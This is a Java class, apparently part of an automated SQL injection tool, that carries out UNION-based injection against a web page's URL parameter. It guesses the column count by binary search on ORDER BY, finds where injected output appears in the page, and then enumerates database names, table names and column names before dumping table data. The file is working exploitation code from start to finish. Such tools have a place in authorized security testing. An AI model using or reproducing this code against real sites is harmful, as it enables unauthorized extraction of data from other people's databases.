package com.pagen.examination.InjectTest;

import com.pagen.examination.InjectTest.Driver.BaseDriver;
import com.pagen.examination.InjectTest.Driver.Boundaries;
import com.pagen.examination.InjectTest.Driver.UnionSelectDriver;
import com.pagen.examination.URL_Pages_Translation;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * Union注入实现类
 */
public class UnionSelectTest {
    private final double similarThreshold = 0.96;
    private List<UnionSelectDriver> sqlNameInject;
    private List<UnionSelectDriver> tableNameInject;
    private List<UnionSelectDriver> columnNameInject;
    private List<UnionSelectDriver> dataInject;
    private BaseOperation opera;
    private URL_Pages_Translation page;
    private Boundaries boundaries;

    /**
     * 构造方法
     *
     * @param page：原始页面
     */
    public UnionSelectTest(URL_Pages_Translation page, Boundaries boundaries) {
        try {
            UploadPayload();
            this.page = page;
            opera = new BaseOperation();
            this.boundaries = boundaries;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 运行测试用例，检测 SQL 注入中 URL 的边界信息，判断是什么类型的注入
     *
     * @return 边界
     */
    public UnionSelectDriver runTestPayload() throws MalformedURLException {
        String originUrl = page.getUrl().toString();
        page.setPageInfo(new URL(originUrl));
        String originPage = page.getPageInfo();

        int col_num = OrderByGuess(originUrl, originPage, 1, 100);
        if (col_num < 1)
            return null;
        UnionSelectDriver res = new UnionSelectDriver();
        outputGuess(originUrl, col_num, res);

        if (res.getPayload() != null) {
            return res;
        }
        return null;
    }

    /**
     * ORDER BY 二分法猜解列数
     *
     * @param originUrl：原始    URL
     * @param originPage：原始页面
     * @param col_left：列数最小值
     * @param col_right：列数最大值
     * @return 猜解得到的列数，猜不到为 -1
     */
    private int OrderByGuess(String originUrl, String originPage, int col_left, int col_right) throws MalformedURLException {

        String orderByUrl = originUrl + boundaries.getPrefix() + "order%20by%20" + col_left + boundaries.getSuffix();
        page.setPageInfo(new URL(orderByUrl));
        String orderByLeft = page.getPageInfo();
        double similar = opera.Leven(originPage, orderByLeft);
        System.out.println("原始页面与最小 order 页面的相似度：" + similar);
        if (similar < similarThreshold)
            return -1;

        orderByUrl = originUrl + boundaries.getPrefix() + "order%20by%20" + col_right + boundaries.getSuffix();

        page.setPageInfo(new URL(orderByUrl));
        String orderByRight = page.getPageInfo();
        similar = opera.Leven(originPage, orderByRight);
        System.out.println("原始页面与最大 order 页面的相似度：" + similar);
        if (similar > similarThreshold)
            return -1;

        while (col_left < col_right - 1) {
            int col_mid = (col_left + col_right) / 2;
            orderByUrl = originUrl + boundaries.getPrefix() + "order%20by%20" + col_mid + boundaries.getSuffix();
            page.setPageInfo(new URL(orderByUrl));
            String orderByMid = page.getPageInfo();

            if (opera.Leven(originPage, orderByMid) > similarThreshold) {
                col_left = col_mid;
            } else {
                col_right = col_mid;
            }
        }
        return col_left;
    }

    /**
     * 定位输出点
     *
     * @param originUrl : 初始 URL 值
     * @param col_num   : 列数
     * @param res       : 结果存储结构
     */
    private void outputGuess(String originUrl, int col_num, UnionSelectDriver res) {
        try {
            res.SetAttr("payload", null);

            String[] parts = originUrl.split("=");
            int part_num = parts.length;

            StringBuilder outputUrl = new StringBuilder();
            String outputPage;

            int level;
            for (level = 1; level <= 5; level++) {
                parts[part_num - 1] = BaseOperation.getRandomString(4, level);

                outputUrl = new StringBuilder();
                for (int i = 0; i < part_num - 1; i++) {
                    outputUrl.append(parts[i]).append("=");
                }
                outputUrl.append(parts[part_num - 1]);

                page.setPageInfo(new URL(outputUrl.toString()));
                outputPage = page.getPageInfo();

                double similar = opera.Leven(outputPage, boundaries.getFalsePage());
                System.out.println("输出页面与负页面的相似度为：" + similar);
                if (similar > similarThreshold) {
                    break;
                }
            }
            if (level > 5)
                return;

            outputUrl.append(boundaries.getPrefix()).append("union%20select%20");
            String preStr = outputUrl.toString();
            String randStr = BaseOperation.getRandomString(5, 1);

            StringBuilder payloadStr = new StringBuilder();
            for (int i = 1; i < col_num; i++) {
                payloadStr.append(i).append(",");
            }
            payloadStr.append(col_num);

            for (int local = 1; local <= col_num; local++) {
                outputUrl = new StringBuilder(preStr);
                outputUrl.append(payloadStr.toString().replaceAll(String.valueOf(local), randStr));
                outputUrl.append(boundaries.getSuffix());

                page.setPageInfo(new URL(outputUrl.toString()));
                outputPage = page.getPageInfo();

                int index = outputPage.indexOf(randStr);
                if (index != -1) {
                    String payload = outputUrl.toString().replaceAll(randStr, "(PAYLOAD)");
                    res.SetAttr("payload", payload);
                    res.setOutputInPage(index);
                    return;
                }
            }
        } catch (Exception e) {
            System.out.println("URL 错误！！");
        }
    }

    /**
     * 获取所有数据库名
     *
     * @param driver ：驱动
     * @return ：数据库名列表
     */
    public List<String> getSQLsName(UnionSelectDriver driver) {
        List<String> sqlname = new ArrayList<>();
        if (sqlNameInject == null || driver.getPayload() == null) {
            return null;
        }
        for (UnionSelectDriver payload : sqlNameInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int endIndex = sqlPage.indexOf(">>");
                    if (endIndex > driver.getOutputInPage()) {
                        sqlname.add(sqlPage.substring(driver.getOutputInPage(), endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return sqlname;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 获取指定数据库的所有表名
     *
     * @param driver  ： 驱动
     * @param sqlName ： 指定数据库名
     * @return ：表名列表
     */
    public List<String> getTableName(UnionSelectDriver driver, String sqlName) {
        List<String> tableName = new ArrayList<>();
        if (tableNameInject == null || driver.getPayload() == null) {
            return null;
        }
        for (UnionSelectDriver payload : tableNameInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(SQLNAME)", sqlName);
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int endIndex = sqlPage.indexOf(">>");
                    if (endIndex > driver.getOutputInPage()) {
                        tableName.add(sqlPage.substring(driver.getOutputInPage(), endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return tableName;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 获取指定数据库，指定表的所有列名
     *
     * @param driver  ： 驱动
     * @param sqlName ： 指定数据库名
     * @return ：表名列表
     */
    public List<String> getColumnName(UnionSelectDriver driver, String sqlName, String tableName) {
        List<String> columnName = new ArrayList<>();
        if (columnNameInject == null || driver.getPayload() == null) {
            return null;
        }
        for (UnionSelectDriver payload : columnNameInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(SQLNAME)", sqlName);
                    temp = temp.replaceAll("(TABLENAME)", tableName);
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int endIndex = sqlPage.indexOf(">>");
                    if (endIndex > driver.getOutputInPage()) {
                        columnName.add(sqlPage.substring(driver.getOutputInPage(), endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return columnName;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 获取指定 数据库名、表名、列名 的数据
     *
     * @param driver      ： 驱动
     * @param sqlName     ： 指定数据库名
     * @param tableName   ： 指定表名
     * @param columnsName ： 指定列名
     * @return ： 数据列表
     */
    public List<String> getData(UnionSelectDriver driver, String sqlName, String tableName, String columnsName) {
        List<String> data = new ArrayList<>();
        if (dataInject == null || driver.getPayload() == null) {
            return null;
        }
        for (UnionSelectDriver payload : dataInject) {
            int index = 0;
            while (true) {
                try {
                    String temp = payload.getPayload();
                    temp = temp.replaceAll("(SQLNAME)", sqlName);
                    temp = temp.replaceAll("(TABLENAME)", tableName);
                    temp = temp.replaceAll("(COLUMNNAME)", columnsName);
                    temp = temp.replaceAll("(RANDNUM1)", String.valueOf(index));
                    temp = temp.replaceAll("(RANDNUM2)", "1");
                    temp = temp.replaceAll(" ", "%20");
                    String url = driver.getPayload().replaceAll("(PAYLOAD)", temp);

                    page.setPageInfo(new URL(url));
                    String sqlPage = page.getPageInfo();

                    int endIndex = sqlPage.indexOf(">>");
                    if (endIndex > driver.getOutputInPage()) {
                        data.add(sqlPage.substring(driver.getOutputInPage(), endIndex));
                        index++;
                        continue;
                    } else if (index > 0) {
                        return data;
                    }
                    break;
                } catch (Exception ignored) {
                }
            }
        }
        return null;
    }

    /**
     * 加载测试用例
     */
    private void UploadPayload() throws ParserConfigurationException, SAXException, IOException {
        //1、获取解析工厂   SAXParserFactory是protect类型，所以用他的静态方法
        SAXParserFactory factory = SAXParserFactory.newInstance();
        //2、从解析工厂获取解析器
        SAXParser parse = factory.newSAXParser();
        //3、加载文档 Document 注册处理器
        //4、编写处理器
        readDriver handler = new readDriver();
        handler.setClassName("UnionSelectDriver");
        parse.parse("src/xinan/sql/InjectTest/xml/union_select.xml", handler);

        List<BaseDriver> base = handler.getPayloads();     //得到一个List对象，里面包含两个Persond类型的对象<person1,person2>
        sqlNameInject = new ArrayList<>();
        tableNameInject = new ArrayList<>();
        columnNameInject = new ArrayList<>();
        dataInject = new ArrayList<>();
        for (BaseDriver b : base) {
            UnionSelectDriver ub = (UnionSelectDriver) b;
            switch (ub.getTitle()) {
                case "INJECT SQL NAME":
                    sqlNameInject.add(ub);
                    break;
                case "INJECT TABLE NAME":
                    tableNameInject.add(ub);
                    break;
                case "INJECT COLUMN NAME":
                    columnNameInject.add(ub);
                    break;
                case "INJECT DATA":
                    dataInject.add(ub);
                    break;
            }
        }
    }
}